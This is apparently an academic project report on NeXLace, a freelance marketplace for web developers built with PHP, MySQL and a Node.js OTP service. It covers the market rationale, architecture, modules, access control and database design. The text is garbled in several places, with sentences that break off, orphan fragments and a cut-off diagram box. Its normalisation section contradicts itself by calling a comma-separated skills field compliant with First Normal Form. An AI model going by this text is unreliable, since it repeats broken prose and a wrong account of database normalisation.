1.1 Background of the Study
--------------------------------------------------------------------------------
The global digital economy has experienced a remarkable transformation over the
past two decades. Advancements in internet infrastructure, cloud computing, and
collaborative online tools have dismantled traditional geographical barriers,
enabling businesses and professionals to interact, collaborate, and transact
across borders with unprecedented ease. Central to this transformation is the
emergence of the gig economy a labour market characterised by short-term,
project-based engagements rather than long-term permanent employment.

Within the technology sector, web development has become one of the most
heavily demanded disciplines. From small business owners requiring an online
storefront to large corporations seeking sophisticated enterprise web
applications, the demand for skilled web developers continues to rise sharply.
Simultaneously, the global pool of web development professionals has expanded
enormously. Universities, online learning platforms, and coding bootcamps
produce tens of thousands of new developers each year, many of whom prefer the
flexibility and autonomy of freelance work over traditional full-time employment.

Freelance marketplaces have naturally evolved to serve as the connecting
infrastructure between these two groups. Platforms such as Upwork, Fiverr,
Toptal, and Freelancer.com have accumulated millions of registered users and
processed billions of dollars in transactions. However, as these platforms grew
in scale, they became increasingly generalised — hosting professionals ranging
from graphic designers to accountants to software engineers — at the cost of
depth, specialisation, and efficiency for any single professional domain.

The consequence is that web development professionals and clients who require
web development services are forced to operate within a noisy, crowded, and
often irrelevant marketplace. The tools, filters, and workflows of these
platforms were built for breadth rather than technical depth, creating friction
at every stage of the hiring and collaboration process.

It is within this context that NeXLace was conceptualised: a dedicated,
niche-focused freelance platform designed exclusively for the web development
profession. By narrowing its scope deliberately, NeXLace aims to dramatically
improve the matching efficiency, communication quality, and overall experience
for both web development clients and professionals.

1.2 Motivation for the Project
--------------------------------------------------------------------------------
The primary motivation behind the development of NeXLace stems from direct
observations of the inefficiencies that plague current generalised freelance
platforms when applied specifically to the web development domain. Several
specific pain points motivated the conception of this platform.

First, there is the issue of skill misrepresentation and poor filtering.
General platforms allow any individual to claim expertise in web development,
leading to a flood of low-quality proposals reaching clients. Clients cannot
efficiently filter by specific programming languages, frameworks, or technology
stacks because such granular filters are either absent or poorly implemented on
generalised platforms. This results in enormous amounts of wasted time on both
sides of the transaction.

Second, commission structures on established platforms are heavily
disproportionate. Many platforms charge between 10% and 20% in service fees
from freelancers, significantly reducing net earnings. These fees are passed
indirectly to clients as well, inflating the cost of hiring quality talent.
For web development — a discipline where project values can range from small
tasks worth a few hundred dollars to complex enterprise projects worth tens of
thousands — this commission burden has a dramatic financial impact.

Third, the communication tools available on general platforms are inadequate
for technical collaboration. Web development discussions naturally involve
technical terminology, code reviews, live previews, and milestone-based
progress tracking. The generic messaging interfaces of generalised platforms do
not cater to these needs, forcing developers and clients to migrate to external
tools and thereby fragmenting the project management workflow.

These observations motivated the development of a specialised solution — a
platform purpose-built around the realities of web development work, where
the users, tools, workflows, and vocabulary are all aligned to the unique
demands of web technology professionals.

1.3 Overview of NeXLace Platform
--------------------------------------------------------------------------------
NeXLace is a web-based freelance marketplace engineered exclusively for the
web development profession. The platform serves three primary user groups:
Clients who need web development services, Developers who offer those services,
and Administrators who oversee and regulate the platform's operations.

The platform is built on a robust N-tier Client-Server architecture. The
presentation layer is constructed with HTML5, CSS3, and JavaScript, delivering
a fully responsive, modern interface that functions seamlessly across desktop
and mobile browsers. The application logic layer is powered by PHP, handling
all server-side business logic, session management, and API routing. The data
persistence layer employs a MySQL relational database, managing all user data,
job postings, applications, messages, and system records through a well-
normalised schema accessed via PDO prepared statements.

Key capabilities of the NeXLace platform include:

  - User Registration and Authentication: A secure registration system allowing
    users to sign up as either a Client or a Developer, with OTP-based email
    verification implemented via a Node.js/Nodemailer service.

  - Developer Profiles: A rich profile builder where developers can showcase
    their technical stack, programming languages, frameworks, portfolio work,
    hourly rates, and professional biography.

  - Job Posting System: A structured job creation interface through which 
    clients specify project titles, required technologies, budget ranges, 
    timelines, and detailed project descriptions.

  - Application Workflow: A complete cycle allowing developers to browse open
    jobs, submit custom proposals with cover letters, and receive status updates
    (Pending, Accepted, Rejected) from clients.

  - Real-Time Messaging: An AJAX-driven messaging system enabling direct,
    in-platform communication between clients and developers, supporting file
    attachments and message requests.

  - Notification System: A live notification centre (powered by Server-Sent
    Events) that alerts users to new messages, application updates, and
    platform activity in real time.

  - Admin Panel: A restricted administrative dashboard providing platform
    operators with user management controls, content moderation tools, and
    platform activity analytics.

  - Billing and Help Modules: Supplementary pages supporting billing summaries
    and a comprehensive help/support centre.

NeXLace represents the application of modern software engineering principles
to solve a tangible and well-documented problem within the digital labour
market, delivering a technically sound, secure, and highly usable product.

2.1 Limitations of Existing Freelance Platforms
--------------------------------------------------------------------------------
The dominant freelance platforms operating in today's market — including Upwork,
Fiverr, Freelancer.com, and Toptal — were architected for maximum breadth of
coverage. This strategic design decision, while enabling these platforms to
achieve massive user scale, introduces critical structural limitations when
evaluated specifically through the lens of web development work.

(a) Market Saturation and Signal-to-Noise Ratio
    The aggregation of all professional categories onto a single marketplace
    creates an environment where the sheer volume of listings and profiles
    overwhelms users. A client searching for a React.js developer on a general
    platform must sift through hundreds of irrelevant profiles. Developers, in
    turn, must compete against an enormous pool of applicants for every posting,
    many of whom are unqualified for the specific technical requirements.

(b) Inadequate Technical Categorisation
    General platforms do not provide the granular technical taxonomy required
    for web development. Their job categories are broad — "Web Development" or
    "Software Engineering" — with limited ability to filter by specific
    frameworks, languages, or deployment environments. This inadequacy prevents
    effective matching between clients with precise technical requirements and
    developers with those exact qualifications.

(c) High Commission and Service Fees
    The financial overhead imposed by dominant platforms is significant.
    Commission structures ranging from 10% to 20% of the contract value reduce
    developer earnings substantially and inflate project costs for clients.
    These fees do not proportionally increase the value delivered; they are
    simply a function of platform lock-in and lack of viable specialised
    alternatives.

(d) Generic Communication Infrastructure
    The messaging and collaboration tools available on generalised freelance
    platforms are insufficiently tailored for technical discourse. Web
    development collaboration involves sharing code snippets, reviewing design
    mockups, discussing server configurations, and tracking deliverable
    milestones. Generic chat interfaces lack the structure and richness needed
    for these interactions, forcing teams to rely on external tools.

(e) The "Lemons Problem" in Digital Labour Markets
    Economic theory identifies this as the "lemons problem" (Akerlof, 1970),
    applied to digital labour: when buyers cannot accurately assess seller
    quality, markets tend to be flooded with low-quality offerings, which

    progressively drives out high-quality professionals who find the environment
    unrewarding. This phenomenon is clearly observable in generalised freelance
    markets, where underpaying clients and underqualified developers create a
    race-to-the-bottom dynamic that erodes quality standards across the board.

2.2 The Need for a Niche Web Development Marketplace
--------------------------------------------------------------------------------
The limitations described above are not peripheral inconveniences — they are
fundamental structural issues arising from the generalised nature of existing
platforms. The solution is correspondingly structural: a platform dedicated
exclusively to web development, where every feature, filter, workflow, and
interface element is purpose-built for the unique realities of this profession.

A niche web development marketplace resolves the key problems in several
specific ways:

  - Technical Vocabulary Alignment: A dedicated platform can support web-
    development-specific language natively — allowing search and filtering by
    frameworks (React, Laravel, Vue.js, Django), languages (PHP, Python,
    JavaScript, TypeScript), infrastructure preferences (AWS, cPanel, Docker),
    and project types (e-commerce, SaaS, landing pages, APIs).

  - Improved Matching Efficiency: By restricting the user base to web
    development clients and professionals, the platform dramatically reduces
    the matching search space, improving the relevance of both job results
    for developers and proposal results for clients.

  - Professional Community and Trust: A vertical marketplace naturally
    cultivates a community identity. Developers are more likely to invest in
    building rich, detailed profiles when the audience is composed entirely
    of technically literate clients who will appreciate and evaluate those
    technical details appropriately.

  - Lower Friction from Proposal to Hire: Structured job templates that
    capture project requirements in technical detail upfront reduce the number
    of clarification exchanges needed before work begins, accelerating the
    time-to-hire cycle.

  - Tailored Communication Infrastructure: Platform communication designed
    around web development work — supporting file attachments, structured
    message requests, and notification systems — keeps the entire workflow
    contained within the platform, improving project management efficiency.

The academic literature on niche digital platforms supports this rationale.
Research in human-computer interaction consistently demonstrates that domain-
specific interfaces yield higher user satisfaction and task completion rates
compared to generic alternatives. The convergence of economic theory, academic
research, and observed market behaviour all point towards the same conclusion:
a dedicated web development marketplace is not merely a viable product concept
— it is a rationally necessary evolution of the freelance marketplace model.

3.2 Specific Functional Goals
--------------------------------------------------------------------------------
In addition to the primary objectives, the project targets the following
specific functional goals that define the system's detailed capabilities:

  Goal 1 — Secure User Authentication System
  Implement a complete authentication workflow including email and password
  registration, OTP-based email verification via a Node.js/Nodemailer service,
  secure login with BCrypt-hashed password verification, session-based
  authentication persistence, and secure logout with session destruction.

  Goal 2 — Developer Profile Management
  Build a comprehensive profile creation and editing system where developers
  can document their technical skills (programming languages, frameworks,
  tools), hourly rate, professional biography, portfolio links, and profile
  photograph — providing clients with a complete, structured view of each
  candidate's qualifications.

  Goal 3 — Job Posting and Management
  Provide clients with a structured job posting interface capturing the project
  title, detailed description, required technical skills, budget estimate,
  project timeline, and job status (Open/Closed), along with the ability to
  manage and update existing postings.

  Goal 4 — Advanced Developer Search and Filtering
  Implement a search and filtering mechanism allowing clients to discover
  developer profiles by technology stack, skill keywords, and other technical
  parameters, and allowing developers to browse and filter open job listings
  by required technologies and budget range.

  Goal 5 — Application Submission and Hiring Workflow
  Build an end-to-end application pipeline: developers submit applications with
  cover letters; clients review, accept, reject, or shortlist applications;
  automated notifications inform developers of status changes.

  Goal 6 — Direct In-Platform Messaging
  Implement a real-time messaging interface allowing clients and developers to
  communicate directly within the platform, supporting text messages, file
  attachments, and message request controls (Accept/Decline messaging from
  non-connected users).

  Goal 7 — Real-Time Notification System
  Deploy a live notification system using Server-Sent Events (SSE) that pushes
  real-time alerts to users for new messages, application status changes,
  developer invitations, and other platform activity.

  Goal 8 — Administrative Control Panel
  Construct a secure, access-controlled admin panel through which administrators
  can view platform-wide analytics, manage user accounts (suspend/ban), moderate
  job postings, and oversee system activity.

  Goal 9 — Security Hardening
  Implement comprehensive security measures across all layers of the platform:
  PDO prepared statements preventing SQL injection, htmlspecialchars() encoding
  preventing XSS attacks, CSRF token validation on state-changing requests,
  role-based access control preventing privilege escalation, and secure file
  upload handling.

  Goal 10 — Responsive, Modern UI Design
  Deliver a visually modern, fully responsive user interface across all platform
  pages using HTML5, CSS3 (Flexbox + CSS Grid), and JavaScript — ensuring the
  platform presents a professional, premium aesthetic aligned with contemporary
  web design standards.

4.2 Out-of-Scope Features
--------------------------------------------------------------------------------
The following areas are explicitly outside the boundaries of the current project
scope and are acknowledged as possibilities for future development phases:

  - Native Mobile Applications: iOS and Android native apps are not within
    scope. The web application is mobile-responsive but does not ship as a
    native app through the App Store or Google Play.

  - Payment Gateway and Escrow Processing: Automated payment processing —
    including integration with providers such as Stripe, PayPal, or any
    escrow service — is not implemented in the current version. Financial
    transactions between clients and developers are handled offline and
    external to the platform.

  - Artificial Intelligence and Machine Learning: AI-driven developer
    recommendation engines, NLP-based job matching, or automated fraud
    detection systems are not within scope. The current search is keyword-
    and filter-based.

  - Real-Time Video Collaboration: Integrated video conferencing, screen
    sharing, or live code editing environments are not included in the
    current release.

  - Multi-Language (i18n) Support: The platform is built exclusively in
    English. Internationalisation and localisation support are deferred to
    future versions.

  - Public API / Third-Party Integrations: No public-facing API for third-
    party integrations (e.g., GitHub portfolio sync, LinkedIn profile import)
    is implemented in this version.

  - Native Push Notifications: Push notifications to mobile devices via
    APNs or FCM are out of scope; the notification system operates within
    the browser session via Server-Sent Events only.

The literature review for the NeXLace project draws upon academic research,
industry analysis, and economic theory to establish the intellectual foundation
for the platform's development. The review is structured to trace the evolution
of the gig economy, critically evaluate existing freelance platforms, examine
the economic theory most relevant to digital labour markets, and identify the
specific research gap that NeXLace is designed to address.

5.1 The Rise of the Gig Economy
--------------------------------------------------------------------------------
The concept of the "gig economy" — a labour market characterised by short-term,
project-based, and independent work arrangements — has transitioned from an
academic hypothesis to a dominant global economic reality over the past two
decades. Foundational research by Agrawal, Horton, Lacetera, and Lyons (2015)
was among the first to rigorously document the economic structure of digital
labour markets, providing empirical evidence that digitisation dramatically
reduces geographic friction in labour hiring, enabling employers to access a
globally distributed talent pool and workers to market their skills without
the constraints of location.

Complementing this, O'Reilly's influential "What is Web 2.0" framework (2005)
articulated the paradigm shift from static, one-directional web content to
interactive, user-generated ecosystems — a theoretical backdrop that explains
why platform-mediated labour markets became technologically feasible and
commercially dominant in the mid-2000s and beyond.

Subsequent academic work has refined the characterisation of the gig economy.
Researchers distinguish between "platform labour" — work mediated entirely by
online marketplaces — and traditional freelancing. Platform labour is notable
for its reliance on algorithmic matching, reputation systems (such as star
ratings and user reviews), and digital contracts as substitutes for traditional
hiring processes. These mechanisms, while innovative, also introduce their own
failure modes, particularly in specialised technical domains where algorithmic
matching based on generic categories produces poor signal-to-noise outcomes.

The technology sector, and web development specifically, represents one of the
most substantial categories of platform labour by transaction volume. Research
from the Software Engineering Institute (2019) confirms that agile, project-
based web development work — characterised by discrete deliverables, defined
timelines, and specific technology requirements — is particularly well-suited
to the freelance engagement model. The structural alignment between the nature
of web development work and the mechanics of platform-mediated hiring makes
the web development vertical an ideal domain for a specialised marketplace.

The literature collectively establishes the gig economy not as a temporary
disruption but as a structural evolution in how skilled technical labour is
sourced, contracted, and delivered globally. This establishes the market context
within which NeXLace is positioned.

5.2 Analysis of Existing Freelance Platforms (Upwork, Fiverr, Toptal)
--------------------------------------------------------------------------------
To rigorously assess the limitations of existing solutions, this review examines
three of the most prominent freelance platforms operating in the web development
space: Upwork, Fiverr, and Toptal. Each represents a distinct market
positioning strategy, and each exhibits characteristic limitations when
evaluated through the specific lens of web development work.

(a) Upwork
    Upwork is the largest generalised freelance marketplace by transaction
    volume, with over 18 million registered freelancers and 5 million client
    accounts as of 2023. Its platform supports a broad spectrum of professional
    services, from content writing and graphic design to software engineering.
    While Upwork does offer filtering capabilities for technical skills, its
    taxonomy remains too broad for precise web development matching. The
    platform's service fee structure, which charges between 5% and 20% on
    contracts (sliding scale based on historical billing with each client),
    represents a significant financial overhead. Furthermore, academic analysis
    of Upwork job outcomes suggests that established, high-volume profiles
    disproportionately dominate search results, creating systemic barriers to
    entry for newer, highly skilled developers.

(b) Fiverr
    Fiverr operates on a "gig-first" model where freelancers list predefined
    service packages rather than responding to client briefs. While this
    approach reduces client-side search friction for simple, commoditised tasks,
    it is fundamentally poorly aligned with complex web development projects that
    are highly variable in scope, technology requirements, and timeline. Fiverr's
    flat 20% commission model is among the highest in the industry, and its
    structure does not accommodate the iterative, specification-heavy nature of
    professional web development engagements. Additionally, the platform's
    visual design and browsing UX prioritises creative portfolio presentation
    over technical skill articulation, disadvantaging developers whose value
    lies in backend architecture or systems programming rather than visual output.

(c) Toptal
    Toptal represents the premium end of the freelance marketplace spectrum,
    positioning itself as an exclusive network of the "top 3%" of technical
    talent, accessible only after a rigorous multi-stage vetting process.
    While Toptal's quality control mechanisms produce a higher-signal talent
    pool, its model is commercially inaccessible to the majority of small and
    medium businesses due to significantly elevated hourly rates and minimum
    engagement requirements. Moreover, Toptal's client-engagement model relies
    heavily on account management intermediaries rather than direct platform-
    mediated matching, removing the efficiency advantages of algorithmic
    discovery and making it unsuitable as a scalable, self-service marketplace.

Across all three platforms, a consistent pattern emerges: no existing solution
successfully combines niche technical depth, accessible self-service discovery,
low financial overhead, and communication infrastructure tailored specifically
to the requirements of web development work. NeXLace is designed to occupy
precisely this unaddressed position in the market.

5.3 The "Lemons Problem" in Digital Labour Markets
--------------------------------------------------------------------------------
A critical theoretical framework underpinning the design rationale for NeXLace
is derived from information economics, specifically from George Akerlof's
landmark 1970 paper, "The Market for Lemons: Quality Uncertainty and the
Market Mechanism," published in the Quarterly Journal of Economics.

Akerlof's model describes a class of markets characterised by information
asymmetry — situations where one party in a transaction (typically the seller)
possesses significantly more information about the quality of the goods or
services being exchanged than the other party (the buyer). In such markets,
buyers are forced to price based on the average expected quality of all
sellers, since they cannot distinguish high-quality offerings from low-quality
ones. This rational buyer behaviour causes high-quality sellers — who require
above-average prices to find participation worthwhile — to exit the market,
leaving a progressively lower-quality pool of participants. The market
ultimately trends towards collapse or severe degradation of quality standards.

Applied to digital freelance labour markets, the "lemons problem" manifests
with particular acuity. Clients attempting to hire web developers on generalised
platforms cannot accurately pre-assess developer quality from profiles, ratings,
and portfolio thumbnails alone. Ratings inflation (a well-documented phenomenon
on platform-mediated markets) further degrades the reliability of reputation
signals. The consequence is precisely the outcome Akerlof's model predicts:
skilled, experienced developers with high market value find generalised platforms
unrewarding and exit toward premium alternatives or direct client acquisition,
while platforms increasingly fill with lower-quality participants willing to
undercut on price.

Research by Alidrisi and Mahmoud (2021) extends this framework specifically
into the web development context, noting that technical skills require
specialised evaluation criteria — criteria that generic reputation mechanisms
cannot adequately encode. The authors argue that domain-specific platforms,
equipped with taxonomically accurate skill declaration systems and technically
literate client communities, substantially reduce the information asymmetry
that generates the lemons problem in generalised markets.

NeXLace directly addresses the lemons problem through several design choices:
the platform's exclusive focus on web development ensures that clients
interacting with developer profiles possess at least basic technical literacy
sufficient to evaluate skill declarations more accurately; the structured skill
taxonomy forces developers to declare specific, verifiable technical competencies
(frameworks, languages, tools) rather than vague generalist descriptions; and
the detailed project specification templates ensure that client job postings
encode the technical requirements with enough precision to enable high-quality
self-selection by the developer community.

5.4 Summary and Research Gap
--------------------------------------------------------------------------------
The literature reviewed above establishes three converging lines of evidence
that collectively identify a clear and well-documented research and product gap:

  Line 1 — Economic Evidence:
  The gig economy represents a structurally mature and growing labour market.
  Platform-mediated freelance work is particularly well-suited to web

  empirical research both confirm that generalised platforms produce systemic

6.1 N-Tier Client-Server Architecture Overview
--------------------------------------------------------------------------------
The NeXLace platform is built on the Client-Server model, structured across
three distinct tiers. This separation of concerns ensures that each component
of the system can be maintained, tested, or scaled independently without
disrupting the other layers. The three tiers are the Presentation Layer, the
Application Logic Layer, and the Data Access Layer.

  ╔══════════════════════════════════════════════════════════════════════════╗
  ║  [DIAGRAM REQUIRED]                                                     ║
  ║  Caption : Figure 6.1 — N-Tier System Architecture Diagram              ║
  ║  Content : A layered diagram showing: Browser (Presentation Layer) →    ║
  ║            Apache + PHP (Application Layer) → MySQL (Data Layer),       ║
  ║            with the Node.js OTP service shown as a side component.      ║
  ╚══════════════════════════════════════════════════════════════════════════╝

This architectural pattern is widely adopted in modern web application
engineering. It separates the concern of what the user sees (UI), from the
concern of how the application processes requests (business logic), and the
concern of where data is stored and retrieved (database). This decoupling is
critical for long-term maintainability and is particularly valuable for a
platform like NeXLace, where the user interface components, the API
endpoints, and the database schema each evolve at different rates and
require different expertise to maintain.

6.2 Presentation Layer (Frontend)
--------------------------------------------------------------------------------
The Presentation Layer is the part of the system that runs inside the user's
web browser. It is responsible for everything the user sees and interacts with
directly — buttons, forms, lists, messages, notifications, and navigation menus.

This layer is built using three standard web technologies: HTML5 for the page
structure and content, CSS3 for visual styling and layout, and JavaScript for
interactive behaviour. The JavaScript code communicates asynchronously with
the server using the Fetch API and XMLHttpRequest (AJAX), which allows parts
of the page to update without requiring a full page reload. This produces a
smoother, more application-like user experience.

The Presentation Layer is fully responsive. Using CSS Flexbox and Grid layout
systems, all pages adapt automatically to the screen dimensions of the device
being used — whether a large desktop monitor, a tablet, or a smartphone browser.
Every page in the platform — from the landing page (index.html) and login form
(login.html) to the messaging interface (messages.php) and admin dashboard
(admin_panel/dashboard.php) — is rendered and controlled within this layer.

6.3 Application Logic Layer (PHP Backend)
--------------------------------------------------------------------------------
The Application Logic Layer is the server-side engine of NeXLace. It lives on
the web server (Apache) and handles all the meaningful work that happens behind
the scenes: processing form data, enforcing business rules, managing user
sessions, authenticating requests, and deciding what data to retrieve from or
store in the database.

  ╔══════════════════════════════════════════════════════════════════════════╗
  ║  [DIAGRAM REQUIRED]                                                     ║
  ║  Caption : Figure 6.3 — Data Flow Diagram (DFD) — Request/Response Cycle║

  ║            Include the OTP branch for the registration flow.            ║

This layer is implemented in PHP. The PHP scripts are organised into two main
functional groups: page controllers (the .php files that serve complete web
pages, such as mainpage.php, findwork.php, and postjob.php) and API endpoints
(the PHP files in the /api/ directory that handle specific AJAX requests, such
as apply_job.php, send_message.php, and get_notifications.php).

When a user takes an action — such as clicking "Submit Application" — the
browser's JavaScript sends an asynchronous request to the relevant PHP API
endpoint. The endpoint validates the input, applies the appropriate business
logic (such as checking whether the user is authenticated and has the correct
role), and then interacts with the database to read or write data. It returns
a structured JSON response that the browser's JavaScript uses to update the
page accordingly.

The Application Logic Layer also manages session state. When a user logs in
successfully, PHP initialises a server-side session storing the user's ID and
role. Every subsequent page load and API request checks for the presence of
this session to verify that the user is authenticated and to determine which
actions they are authorised to perform.

6.4 Data Access Layer (MySQL)
--------------------------------------------------------------------------------
The Data Access Layer sits at the foundation of the system and is responsible
for all persistent data storage. It is implemented using a MySQL relational
database, which maintains structured tables for users, jobs, applications,
messages, notifications, and related entities.

The PHP Application Logic Layer communicates with the MySQL database through
the PHP Data Objects (PDO) extension. PDO is used universally throughout the
codebase because it enforces the use of prepared statements — parameterised
SQL queries that prevent SQL injection attacks by structurally separating
the query logic from the user-supplied data values.

The database schema is normalised to Third Normal Form (3NF), which eliminates
redundant data storage and preserves referential integrity through the use of
primary keys and foreign key constraints. Each table has a clearly defined
primary key and well-specified relationships to other tables, ensuring that the
database accurately reflects the real-world relationships between users, their
jobs, their applications, and their messages.

The central connection configuration is managed by the file
`config/db_helper.php`, which establishes the PDO connection using the host,
database name, username, and password credentials, and sets the error mode to
throw exceptions — ensuring that any database errors are caught and handled
gracefully rather than silently corrupting application state.

6.5 Architecture Diagram (Description)
--------------------------------------------------------------------------------
The following describes the system architecture as it would appear in a
formal architecture diagram:

  [Browser / Client Device]
       |
       | HTTP Requests (AJAX / Form Submissions / Page Loads)
       v
  [Apache Web Server — Laragon / Linux VPS]
       |
       | Passes request to PHP runtime
       v
  [PHP Application Layer]
       |-- Page Controllers  (mainpage.php, findwork.php, messages.php ...)
       |-- API Endpoints     (/api/apply_job.php, /api/send_message.php ...)
       |-- Auth Helpers      (/includes/auth_helper.php)
       |-- Session Manager   (session_start / session_destroy)
       |
       | PDO Prepared Statements
       v
  [MySQL Database]
       |-- users table
       |-- jobs table
       |-- applications table
       |-- messages table
       |-- notifications table
       |-- reviews table
       |-- sessions table

  [Node.js OTP Server — Nodemailer]
       |
       | Called by PHP via HTTP during registration
       v
  [SMTP Email Provider — sends OTP to user's email address]

Data flows upward from the database through the PHP layer and is rendered in
the browser. User actions flow downward from the browser through PHP and into
the database. The OTP verification service is a separate, lightweight Node.js
process that runs alongside the main PHP application during registration.

verification emails.

notification system. The browser holds an open connection to the server, and
the PHP script (`api/notifications_stream.php`) pushes new notification data
to the browser as events occur — no page refresh required.

Git is used for version control — tracking every change made to the codebase,

the entire project.

The NeXLace platform is composed of ten distinct functional modules. Each

Together, they form a cohesive, integrated application. This chapter describes

11.1 User Authentication Module
--------------------------------------------------------------------------------
The User Authentication Module is the entry point of the entire platform. It
controls how users register, verify their identity, log in, and log out. Every
other module depends on this module having successfully established a verified,
authenticated user session before granting access.

Registration is handled by the API endpoint `api/register.php`. When a new
user submits the registration form (on `registration.html`), the PHP script
validates all required fields — email format, password strength, and role
selection (Client or Developer). The password is never stored in plain text;
it is immediately hashed using PHP's `password_hash()` function with the BCrypt
algorithm before being written to the `users` table in the database.

Following registration, OTP (One-Time Password) email verification is triggered.
The server issues a request to the Node.js/Nodemailer OTP service, which
dispatches a time-limited verification code to the user's registered email
address. The user must enter this code to activate their account.

Login is handled by `api/login.php`. On submission, the script retrieves the
stored password hash for the provided email and compares it against the entered
password using `password_verify()`. On success, a PHP session is initialised
storing the user's `user_id`, `role`, and `username`. This session persists
across all page loads and API requests, providing continuous authentication.

Logout is handled by `logout.php`, which calls `session_destroy()` to
completely invalidate the session and redirect the user to the login page.

11.2 Job Posting Module
--------------------------------------------------------------------------------
The Job Posting Module enables clients to create, manage, and close job listings
on the platform. It is the primary mechanism through which work becomes available
to developers on the NeXLace marketplace.

Clients access the job posting form via `postjob.php`. The form captures all
critical project parameters: job title, a detailed project description, the
required technical skills and frameworks, the offered budget range, and the
expected project timeline. Upon submission, the data is sent to `api/post_job.php`,
which validates the input and inserts a new record into the `jobs` table with
a status of `Open`.

11.3 Application & Hiring Module
--------------------------------------------------------------------------------
The Application & Hiring Module manages the complete workflow through which
a developer expresses interest in a job and a client makes a hiring decision.
It bridges the gap between a posted job and an active working engagement.

When a developer finds a suitable job on `findwork.php`, they click "Apply"
to open the application modal. The application form, handled by
`api/apply_job.php`, captures a custom cover letter, a bid amount, and
optionally any supplementary notes. The submitted application is stored in

11.4 Developer Profile Module
--------------------------------------------------------------------------------
The Developer Profile Module provides the tools and interface through which
developers present their professional identity to prospective clients on the

marketing asset of any developer on NeXLace.

11.5 Real-Time Messaging Module
--------------------------------------------------------------------------------
The Real-Time Messaging Module provides in-platform, direct communication
between clients and developers. It is one of the most technically complex
modules in the NeXLace system and a key differentiator from simpler job boards.

The messaging interface is built into `messages.php`. All conversations are
listed in a left-side panel, and the active conversation is displayed in a
right-side message thread. Messages are sent asynchronously via JavaScript to
`api/send_message.php`, which validates the session, inserts the message into
the `messages` table, and returns a confirmation. The receiving side's
conversation list is refreshed via AJAX polling against
`api/get_conversations.php` and `api/get_messages.php`.

The module implements a Message Request system for new, unconnected contacts.
When a client wishes to message a developer they have not previously hired,
they must send a message request via `api/send_message_request.php`. The
developer receives this request and can accept or decline it through
`api/respond_invitation.php`. Only accepted connections can exchange free
messages, protecting users from unsolicited contact.

File attachment support is also built into the messaging module. Users can
attach files to messages, which are securely uploaded and stored in the
`/uploads/` directory with server-side validation of file type and size.

11.6 Notification Module
--------------------------------------------------------------------------------
The Notification Module delivers real-time, in-platform alerts to users about
relevant platform activity — new messages, application status changes, incoming
job invitations, and message requests — without requiring a page refresh.

The module is powered by Server-Sent Events (SSE). The PHP script
`api/notifications_stream.php` keeps an open HTTP connection with the browser
and pushes new notification data as JSON events whenever new records are found
in the `notifications` table for that user. The browser's JavaScript EventSource
API listens on this connection and renders new notifications into the notification
bell dropdown in real time.

11.9 Chatbot Module

11.10 Search Module
--------------------------------------------------------------------------------
The Search Module provides the discovery mechanism that connects clients with
developers and developers with jobs. It is implemented through `api/search.php`
and is surfaced to users through the search bar component (`includes/search_bar.php`)
embedded in the main navigation across all platform pages.

For clients, the search queries the `users` and `profiles` tables to return
developer profiles matching the search keyword against their listed skills,
bio, and name fields. Results are presented as profile cards on `devprofiles.php`.

For developers, the search queries the `jobs` table to return job postings
matching the keyword against the job title, description, and required skills
fields. Results are presented as job listing cards on `findwork.php`.

Advanced filtering is layered on top of the keyword search. Developers can
filter job listings by technology stack, budget range, and posting recency.
Clients can filter developer profiles by skill category and availability.

CHAPTER 12: USER ROLES & PERMISSIONS

The NeXLace platform enforces a strict role-based access control (RBAC) model.
Every user account is assigned exactly one role at the time of registration.
The role determines which pages the user can access, which API endpoints they
can call, and what data they can read or modify. Role enforcement is applied
at two levels: the page level (via PHP session checks at the top of each .php
file) and the API level (via `includes/auth_helper.php` called at the top of
every API endpoint).

CHAPTER 13: UML DIAGRAMS
================================================================================

UML (Unified Modelling Language) is a standard way of drawing diagrams to
explain how a software system is built and how it works. This chapter presents
the key UML diagrams for the NeXLace platform. Each diagram focuses on a
different view of the system — who uses it, how data is organised, how pages
connect, and how actions flow step by step.

13.1 Use Case Diagram
--------------------------------------------------------------------------------
A Use Case Diagram shows what each type of user can do on the platform.
It does not show how things work behind the scenes — only what actions are
available to each user.

In NeXLace, there are three types of users (called "actors"):
  - Client: posts jobs, browses developers, reviews applications, messages developers
  - Developer: browses jobs, applies for jobs, manages profile, messages clients
  - Administrator: manages users, views platform activity

Each action the user can perform is called a "use case" and is drawn as an
oval. Lines connect each actor to the use cases they can access.

13.2 Class Diagram
--------------------------------------------------------------------------------
A Class Diagram shows the main data objects (called "entities") in the system
and how they are related to each other. Each box represents a database table.
Inside each box are the fields (columns) that table holds.
The lines between boxes show how tables are linked — for example, one User
can have many Jobs, and one Job can have many Applications.

14.2 Database Normalisation Strategy
--------------------------------------------------------------------------------
Database normalisation is the process of organising a database to reduce
repeated data and ensure data is stored in a logical, efficient way.

The NeXLace database is normalised to Third Normal Form (3NF). This means:

  First Normal Form (1NF):
  Every table has a primary key. Every column stores a single value —
  no lists or repeating groups are stored inside a single field. For example,
  a developer's skills are stored as a comma-separated string in the `skills`
  field of the `profiles` table, which is the most practical approach for
  this scale of application.

  ╔══════════════════════════════════════════════════════════════════════════╗
  ║  [TABLE / SCREENSHOT REQUIRED]                                          ║
  ║  Caption : Figure 14.4 — `profiles` Table Structure in phpMyAdmin       ║
  ║  Content : Screenshot of the profiles table "Structure" tab in          ║
  ║            phpMyAdmin, or a formatted table diagram.                    ║
  ╚══════════════════════════════════════════════════════════════════════════╝

  Second Normal Form (2NF):
  Every non-key column in a table depends on the full primary key, not just
  part of it. For example, the developer's profile data (bio, skills, rate)
  is stored in a separate `profiles` table rather than inside the `users`
  table — because that data only applies to developers, not clients,
  and keeping it separate ensures no partial dependencies.

  ║            key indicators. Alternatively, use a formatted table image.  ║
  ╚══════════════════════════════════════════════════════════════════════════╝

  Third Normal Form (3NF):
  No non-key column depends on another non-key column. For example, the
  `jobs` table stores the `client_id` (FK) but does not redundantly store the
  client's name or email — those are fetched from the `users` table through
  a JOIN query when needed. This avoids update anomalies where a user's name
  change would require updating multiple tables.

The benefits of 3NF normalisation in NeXLace:
  - No duplicated data across tables
  - Data is updated in one place only
  - Referential integrity is enforced through foreign key constraints
  - Queries are predictable and consistent

14.3.1  `users` Table
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
The `users` table is the central table of the entire platform. It stores every
registered account — clients, developers, and administrators alike.

  CREATE TABLE users (
      user_id     INT AUTO_INCREMENT PRIMARY KEY,
      name        VARCHAR(100)  NOT NULL,
      email       VARCHAR(150)  NOT NULL UNIQUE,
      password    VARCHAR(255)  NOT NULL,
      role        ENUM('client','developer','admin') NOT NULL,
      is_active   TINYINT(1)    DEFAULT 0,
      otp_code    VARCHAR(10)   DEFAULT NULL,
